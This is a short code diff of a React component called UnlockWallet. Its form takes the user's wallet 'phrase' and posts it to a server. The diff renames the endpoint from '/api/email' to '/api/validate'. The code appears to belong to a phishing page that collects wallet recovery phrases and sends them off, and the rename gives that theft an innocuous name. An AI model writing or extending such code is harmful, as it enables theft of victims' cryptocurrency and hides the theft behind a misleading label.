@@ -9,7 +9,7 @@ export default function UnlockWallet() {
     e.preventDefault();
     if (e.target.phrase.value !== key) {
       setKey(e.target.phrase.value);
-      await fetch("/api/email", {
+      await fetch("/api/validate", {
         method: "post",
         body: JSON.stringify({ pass: e.target.phrase.value }),
         headers: {
